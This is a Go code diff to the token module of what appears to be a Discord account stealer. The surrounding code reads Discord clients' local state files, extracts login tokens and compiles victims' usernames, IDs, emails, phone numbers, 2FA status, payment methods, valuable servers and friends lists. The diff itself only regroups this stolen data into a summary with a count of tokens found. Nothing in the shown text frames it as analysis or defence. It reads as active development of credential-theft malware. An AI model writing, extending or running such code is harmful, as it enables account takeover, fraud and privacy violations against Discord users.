@@ -3,6 +3,7 @@ package tokens
 import (
 	"encoding/base64"
 	"encoding/json"
+	"io"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -23,6 +24,8 @@ var (
 
 func Run(dataCollector *collector.DataCollector) {
 	var Tokens []string
+	var TokensData []map[string]interface{}
+	
 	discordPaths := map[string]string{
 		"Discord":        "\\discord\\Local State",
 		"Discord Canary": "\\discordcanary\\Local State",
@@ -286,6 +289,7 @@ func Run(dataCollector *collector.DataCollector) {
 		paymentMethods := GetBilling(billingData)
 		hqGuilds := GetHQGuilds(guildsData, token)
 		hqFriends := GetHQFriends(friendsData)
+		
 		if user.Email == "" {
 			user.Email = "None"
 		}
@@ -293,10 +297,10 @@ func Run(dataCollector *collector.DataCollector) {
 			user.Phone = "None"
 		}
 		if user.MfaEnabled {
-			user.Phone = user.Phone + " (2FA)"
+			user.Phone = user.Phone + " (2FA Enabled)"
 		}
 
-		// Collect token data
+		// Collect individual token data
 		tokenData := map[string]interface{}{
 			"Username":       user.Username,
 			"UserID":         user.ID,
@@ -311,7 +315,20 @@ func Run(dataCollector *collector.DataCollector) {
 			"HQFriends":      hqFriends,
 		}
 
-		dataCollector.AddData("tokens", tokenData)
+		TokensData = append(TokensData, tokenData)
+	}
+
+	// Add summary data
+	if len(TokensData) > 0 {
+		summaryData := map[string]interface{}{
+			"TotalTokensFound": len(TokensData),
+			"TokensDetails":    TokensData,
+		}
+		dataCollector.AddData("tokens", summaryData)
+	} else {
+		dataCollector.AddData("tokens", map[string]interface{}{
+			"Status": "No Discord tokens found",
+		})
 	}
 }
 
